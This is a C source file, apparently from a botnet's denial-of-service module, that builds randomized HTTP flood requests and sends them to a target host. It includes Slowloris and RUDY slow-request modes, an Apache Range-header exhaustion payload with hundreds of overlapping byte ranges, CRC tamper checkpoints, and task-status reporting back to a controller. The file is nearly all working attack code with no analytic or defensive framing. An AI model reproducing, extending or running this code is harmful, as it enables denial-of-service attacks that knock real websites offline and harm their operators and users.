#include "../Includes/includes.h"

char *GenerateHttpPacket(unsigned short usType, char *cHttpHost, char *cHttpPath, unsigned short usHttpPort, char *cHttpData)
{
    srand(GenerateRandomSeed());

    char cNewline[3];
    strcpy(cNewline, "\r\n");

    char cPacket[MAX_DDOS_BUFFER];

    if((usType == HTTP_GET_NORMAL) || (usType == HTTP_SLOWLORIS))
        strcpy(cPacket, "GET");
    else if((usType == HTTP_POST_NORMAL) || (usType == HTTP_RUDY))
        strcpy(cPacket, "POST");
    else if(usType == HTTP_ARME)
    {
        if(GetRandNum(100) > 50 )
            strcpy(cPacket, "GET");
        else
            strcpy(cPacket, "HEAD");
    }
    else if(usType == HTTP_HEAD)
        strcpy(cPacket, "HEAD");

    strcat(cPacket, " /");
    strcat(cPacket, cHttpPath);

    if((usType != HTTP_POST_NORMAL) && (strlen(cHttpData) > 0))
    {
        strcat(cPacket, "?");
        strcat(cPacket, cHttpData);
    }

    bool bVersionOnePointOne = TRUE;
    if(GetRandNum(300) < 100)
        bVersionOnePointOne = FALSE;

    strcat(cPacket, " HTTP/1.");

    if(bVersionOnePointOne)
        strcat(cPacket, "1");
    else
        strcat(cPacket, "0");

    strcat(cPacket, cNewline);

    if(bVersionOnePointOne)
    {
        strcat(cPacket, "Host: ");
        strcat(cPacket, cHttpHost);

        if(GetRandNum(300) > 100)
        {
            strcat(cPacket, ":");

            char cUnsignedShortAsString[7];
            itoa(usHttpPort, cUnsignedShortAsString, 10);
            strcat(cPacket, cUnsignedShortAsString);
        }

        strcat(cPacket, cNewline);
    }

    // <!-------! CRC AREA START !-------!>
    if(!bConfigSetupCheckpointTen)
        strcpy(cPacket, "0");
    // <!-------! CRC AREA STOP !-------!>

    if(usType == HTTP_ARME)
    {
        strcat(cPacket, "Range: bytes=0-");

        unsigned short usRangeIterations = GetRandNum(500) + 250;
        for(unsigned short us = 0; us < usRangeIterations; us++)
        {
            strcat(cPacket, ",5-");

            char cUnsignedShortAsString[5];
            itoa(us, cUnsignedShortAsString, 10);
            strcat(cPacket, cUnsignedShortAsString);
        }

        strcat(cPacket, cNewline);
    }

    if(bVersionOnePointOne)
    {
        strcat(cPacket, "Connection: ");

        if((usType == HTTP_POST_NORMAL) || (GetRandNum(100) > 10))
            strcat(cPacket, "Keep-Alive");
        else
            strcat(cPacket, "close");

        strcat(cPacket, cNewline);
    }

    if(GetRandNum(100) > 10)
    {
        char cObtainedUserAgentString[DEFAULT];
        DWORD dwUserAgentLength;

        if(fncObtainUserAgentString(0, cObtainedUserAgentString, &dwUserAgentLength) == NOERROR)
        {
            strcat(cPacket, "User-Agent: ");
            strcat(cPacket, cObtainedUserAgentString);
            strcat(cPacket, cNewline);
        }
    }

    if(GetRandNum(100) < 50)
    {
        strcat(cPacket, "Cache-Control: ");

        if(GetRandNum(20) < 10)
        {
            if(GetRandNum(200) > 100)
            {
                if(GetRandNum(100) > 50)
                    strcat(cPacket, "no-cache");
                else
                    strcat(cPacket, "no-store");
            }
            else
            {
                if(GetRandNum(100) > 50)
                    strcat(cPacket, "no-transform");
                else
                    strcat(cPacket, "only-if-cached");
            }
        }
        else
        {
            if(GetRandNum(300) < 150)
            {
                if(GetRandNum(100) > 50)
                    strcat(cPacket, "max-age=0");
                else
                    strcat(cPacket, "public");
            }
            else
            {
                if(GetRandNum(100) > 50)
                    strcat(cPacket, "private");
                else
                    strcat(cPacket, "max-stale");
            }
        }

        strcat(cPacket, cNewline);
    }

    if(GetRandNum(150) > 75)
    {
        strcat(cPacket, "Vary: ");

        if(GetRandNum(50) > 25)
            strcat(cPacket, "*");
        else
            strcat(cPacket, "User-Agent");

        strcat(cPacket, cNewline);
    }

    if(GetRandNum(300) < 200)
    {
        strcat(cPacket, "Accept: ");

        if(GetRandNum(50) > 25)
        {
            if(GetRandNum(200) < 100)
            {
                if(GetRandNum(50) > 25)
                    strcat(cPacket, "text/*, text/html, text/html;level=1, */*");
                else
                    strcat(cPacket, "*/*");
            }
            else
            {
                if(GetRandNum(12) < 6)
                    strcat(cPacket, "text/plain; q=0.5, text/html, text/x-dvi; q=0.8, text/x-c");
                else
                    strcat(cPacket, "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1");
            }
        }
        else
        {
            if(GetRandNum(50) > 25)
            {
                if(GetRandNum(5000) < 2500)
                    strcat(cPacket, "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*");
                else
                    strcat(cPacket, "*");
            }
            else
            {
                if(GetRandNum(100) > 50)
                    strcat(cPacket, "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5");
                else
                    strcat(cPacket, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            }
        }

        strcat(cPacket, cNewline);
    }

    // <!-------! CRC AREA START !-------!>
    if(!bConfigSetupCheckpointSix)
        memset(cPacket, 0, sizeof(cPacket));
    // <!-------! CRC AREA STOP !-------!>

    if(GetRandNum(300) < 50)
    {
        strcat(cPacket, "Accept-Charset: ");

        if(GetRandNum(90) > 45)
        {
            if(GetRandNum(30) < 15)
                strcat(cPacket, "iso-8859-5, unicode-1-1;q=0.8");
            else
                strcat(cPacket, "*");
        }
        else
        {
            if(GetRandNum(30) < 15)
                strcat(cPacket, "UTF-8");
            else
                strcat(cPacket, "ISO-8859-1");
        }

        strcat(cPacket, cNewline);
    }

    if(GetRandNum(2000) < 1000)
    {
        strcat(cPacket, "Accept-Encoding: ");

        if(GetRandNum(50) < 25)
        {
            if(GetRandNum(100) > 50)
                strcat(cPacket, "*");
            else
                strcat(cPacket, "gzip, deflate");
        }
        else
        {
            if(GetRandNum(100) > 50)
            {
                if(GetRandNum(60) > 30)
                    strcat(cPacket, "compress;q=0.5, gzip;q=1.0");
                else
                    strcat(cPacket, "gzip;q=1.0, identity; q=0.5, *;q=0");
            }
            else
            {
                if(GetRandNum(20) < 10)
                    strcat(cPacket, "compress, gzip");
                else
                    strcat(cPacket, "");
            }

        }

        strcat(cPacket, cNewline);
    }

    if(GetRandNum(1000) > 500)
    {
        strcat(cPacket, "Accept-Language: ");

        if(GetRandNum(10) > 5)
            strcat(cPacket, "*");
        else
        {
            if(GetRandNum(120) < 60)
            {
                if(GetRandNum(80) < 40)
                    strcat(cPacket, "es");
                else
                    strcat(cPacket, "de");
            }
            else
            {
                if(GetRandNum(80) < 40)
                    strcat(cPacket, "en-us,en;q=0.5");
                else
                    strcat(cPacket, "en-us, en");
            }
        }

        strcat(cPacket, cNewline);
    }

    if(GetRandNum(100) > 30)
    {
        strcat(cPacket, "Content-Type: ");

        if(usType == HTTP_POST_NORMAL)
        {
            strcat(cPacket, "application/x-www-form-urlencoded");
        }
        else
        {
            if(GetRandNum(30) > 15)
            {
                if(GetRandNum(50) < 25)
                    strcat(cPacket, "text/html; charset=ISO-8859-4");
                else
                    strcat(cPacket, "text/html; charset=UTF-8");
            }
            else
            {
                if(GetRandNum(50) < 25)
                    strcat(cPacket, "application/xhtml+xml; charset=UTF-8");
                else
                    strcat(cPacket, "image/gif");
            }
        }

        strcat(cPacket, cNewline);
    }

    /*if(GetRandNum(100) > 50)
    {
        INTERNET_CACHE_ENTRY_INFO icei;
        DWORD dwCacheEntryBufferSize;
        LPCTSTR lpcSearchPattern = "visited:";

        HANDLE hInternetCache = FindFirstUrlCacheEntry(lpcSearchPattern, &icei, &dwCacheEntryBufferSize);

        if(hInternetCache != NULL)
        {
            strcat(cPacket, "Referer: ");

            do
            {
                printf("3");system("pause");
                printf("%s\n%s\n", icei.CacheEntryType, &icei.lpszSourceUrlName);
                printf("4");system("pause");
            }
            while(FindNextUrlCacheEntry(hInternetCache, &icei, &dwCacheEntryBufferSize) != ERROR_NO_MORE_ITEMS);

            FindCloseUrlCache(hInternetCache);
        }

        strcat(cPacket, cNewline);
    }*/

    /*if(GetRandNum(100) > 50)
    {
        strcat(cPacket, "Referer: ");

        if(GetRandNum(50) > 25)
        {
            if(GetRandNum(20) < 10)
                strcat(cPacket, "http://");
            else
                strcat(cPacket, "https://");
        }

        unsigned short usRandom = GetRandNum(2) + 1;

        for(unsigned short us = 0; us < usRandom; us++)
        {
            printf("%i", us);
            system("pause");
            strcat(cPacket, GenRandLCText());
        }

        strcat(cPacket, ".");

        if(GetRandNum(300) > 150)
        {
            if(GetRandNum(60) < 30)
            {
                if(GetRandNum(60) < 30)
                    strcat(cPacket, "com");
                else
                    strcat(cPacket, "net");
            }
            else
            {
                if(GetRandNum(60) < 30)
                    strcat(cPacket, "ru");
                else
                    strcat(cPacket, "se");
            }
        }
        else
        {
            if(GetRandNum(60) < 30)
            {
                if(GetRandNum(70) > 35)
                    strcat(cPacket, "info");
                else
                    strcat(cPacket, "org");
            }
            else
            {
                if(GetRandNum(70) > 35)
                    strcat(cPacket, "gov");
                else
                    strcat(cPacket, "edu");
            }
        }

        strcat(cPacket, "/");

        if(GetRandNum(60) > 30)
        {
            usRandom = GetRandNum(2) + 1;

            for(unsigned short us = 0; us < usRandom; us++)
            {
                unsigned short usRandomI = GetRandNum(2) + 1;

                for(unsigned short usI = 0; usI < usRandomI; usI++)
                {
                    printf("%i", us);
                    system("pause");
                    strcat(cPacket, GenRandLCText());
                }

                strcat(cPacket, "/");
            }
        }

        if(GetRandNum(40) > 20)
        {
            usRandom = GetRandNum(2) + 1;

            for(unsigned short us = 0; us < usRandom; us++)
            {
                printf("%i", us);
                system("pause");
                strcat(cPacket, GenRandLCText());
            }

            strcat(cPacket, ".");

            if(GetRandNum(80) < 40)
            {
                if(GetRandNum(90) > 45)
                    strcat(cPacket, "asp");
                else
                    strcat(cPacket, "cfm");
            }
            else
            {
                if(GetRandNum(90) > 45)
                    strcat(cPacket, "html");
                else
                    strcat(cPacket, "php");
            }
        }

        strcat(cPacket, cNewline);
    }*/

    if(strlen(cHttpData) > 0)
    {
        strcat(cPacket, "Content-Length: ");

        char cUnsignedShortAsString[5];
        itoa(strlen(cHttpData), cUnsignedShortAsString, 10);
        strcat(cPacket, cUnsignedShortAsString);

        strcat(cPacket, cNewline);
    }

    if(usType != HTTP_SLOWLORIS)
    {
        if((usType == HTTP_POST_NORMAL) || (usType == HTTP_RUDY))
        {
            if(strlen(cHttpData) > 0)
                strcat(cPacket, cHttpData);
        }

        if((usType != HTTP_RUDY))
        {
            strcat(cPacket, cNewline);
            strcat(cPacket, cNewline);
        }
    }

    static char cHttpPacket[DEFAULT];
    strcpy(cHttpPacket, cPacket);

    return (char*)cHttpPacket;
}

char *SendHttpRequest(unsigned short usType, char *cHttpUrl, unsigned short usHttpPort)
{
    char cHttpHost[MAX_PATH];
    char cHttpPath[DEFAULT];
    char cHttpData[DEFAULT];

    char cBreakUrl[strlen(cHttpUrl)];
    strcpy(cBreakUrl, cHttpUrl);

    char *pcBreakUrl = cBreakUrl;

    if(strstr(pcBreakUrl, "http://"))
        pcBreakUrl += 7;
    else if(strstr(pcBreakUrl, "https://"))
        pcBreakUrl += 8;

    pcBreakUrl = strtok(pcBreakUrl, "/");
    if(pcBreakUrl != NULL)
        strcpy(cHttpHost, pcBreakUrl);
    else
        memset(cHttpHost, 0, sizeof(cHttpData));

    pcBreakUrl = strtok(NULL, "?");
    if(pcBreakUrl != NULL)
        strcpy(cHttpPath, pcBreakUrl);
    else
        memset(cHttpPath, 0, sizeof(cHttpData));

    pcBreakUrl = strtok(NULL, "?");
    if(pcBreakUrl != NULL)
        strcpy(cHttpData, pcBreakUrl);
    else
        memset(cHttpData, 0, sizeof(cHttpData));

    unsigned short usPacketGenerationType = usType;

    SOCKADDR_IN httpreq;
    memset(&httpreq, 0, sizeof(httpreq));

    HOSTENT *paddr;

    for(unsigned short us = 0; us < 5; us++)
    {
        paddr = fncgethostbyname(cHttpHost);
        if(paddr != NULL)
            break;

        Sleep(1000);
    }

    if(paddr == NULL)
        return (char*)"ERR_FAILED_TO_RESOLVE_HOST";

    httpreq.sin_addr = (*(in_addr*)*paddr->h_addr_list);

    httpreq.sin_port = fnchtons(usHttpPort);
    httpreq.sin_family = AF_INET;

    SOCKET sSock = NULL;

    do
        sSock = fncsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    while(sSock == INVALID_SOCKET);

    char cPacket[MAX_DDOS_BUFFER];
    strcpy(cPacket, GenerateHttpPacket(usPacketGenerationType, cHttpHost, cHttpPath, usHttpPort, cHttpData));

    static char cReceivedPacket[MAX_DDOS_BUFFER];
    if(fncconnect(sSock, (PSOCKADDR)&httpreq, sizeof(httpreq)) != SOCKET_ERROR)
    {
        if(fncsend(sSock, cPacket, strlen(cPacket), NULL) != SOCKET_ERROR)
        {
            int nReceivedData = fncrecv(sSock, cPacket, MAX_DDOS_BUFFER, 0);
            strcpy(cReceivedPacket, cPacket);
        }
        else
            strcpy(cReceivedPacket, "ERR_FAILED_TO_SEND");
    }
    else
        strcpy(cReceivedPacket, "ERR_FAILED_TO_CONNECT");

    return (char*)cReceivedPacket;
}

DWORD WINAPI GetWebsiteStatus(LPVOID)
{
#ifdef HTTP_BUILD
    int nLocalTaskId = nCurrentTaskId;
#endif

    char cWebsiteUrl[strlen(cStoreParameter)];
    strcpy(cWebsiteUrl, cStoreParameter);

    char cOutput[DEFAULT];
    memset(cOutput, 0, sizeof(cOutput));

    char *pcHttpRequestStatus = SendHttpRequest(HTTP_HEAD, (char*)cWebsiteUrl, 80);
    pcHttpRequestStatus = strtok(pcHttpRequestStatus, "\n");

    bool bSendStatus = FALSE;

    if(pcHttpRequestStatus == NULL || !strstr(pcHttpRequestStatus, "HTTP/1."))
    {
        strcpy(cOutput, "INVALID RESPONSE");
        bSendStatus = TRUE;
    }
    else if(strstr(pcHttpRequestStatus, "HTTP/1."))
    {
        pcHttpRequestStatus += 9;
        strcpy(cOutput, pcHttpRequestStatus);
        bSendStatus = TRUE;
    }

#ifndef HTTP_BUILD
    if(bSendStatus)
        SendWebsiteStatus(cWebsiteUrl, StripReturns(cOutput));
#else
    if(bSendStatus)
    {
        while(!SendHttpCommandResponse(nLocalTaskId, StripReturns(cOutput)))
            Sleep(10000);
    }
#endif

    return 1;
}
